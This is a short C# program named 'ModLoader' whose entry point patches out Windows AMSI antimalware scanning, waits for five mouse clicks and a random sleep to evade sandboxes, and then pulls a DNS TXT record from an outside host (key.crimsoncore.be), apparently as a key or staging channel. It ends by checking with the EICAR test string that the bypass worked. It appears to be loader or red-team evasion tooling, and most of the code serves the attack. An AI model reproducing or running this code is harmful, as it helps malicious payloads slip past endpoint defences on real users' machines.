using System;

namespace ModLoader
{ 
    class Program
    {
        static void Main(string[] args)
        {
            string hostname = "key.crimsoncore.be";
            Console.WriteLine("[+] Patching AMSI CLR...");
            try
            {
                AmsiBypass.AmsiBypassStringReplace();
                Console.WriteLine("AMSI bypass executed.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"AMSI bypass failed: {ex.Message}");
            }
            Console.WriteLine("Waiting for 5 clicks...");
            MouseClickWait.WaitForClicks(); // Wait for 5 clicks by default
            Sleep.RandomSleep();
            try
            {
                string txtRecord = DnsLookup.GetTxtRecord(hostname);
                Console.WriteLine(txtRecord != null ? $"TXT record for {hostname}: {txtRecord}" : $"No TXT record found for {hostname}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
            Console.WriteLine("Press any key to continue...");
            Console.ReadKey();
            Console.WriteLine("Testing AMSI...");
            Console.WriteLine(AmsiTest.TestAmsi() ? "AMSI is working (detected EICAR)." : "AMSI failed or not available...");
            Console.WriteLine("Press any key to continue...");
            Console.ReadKey();
        }
    }
}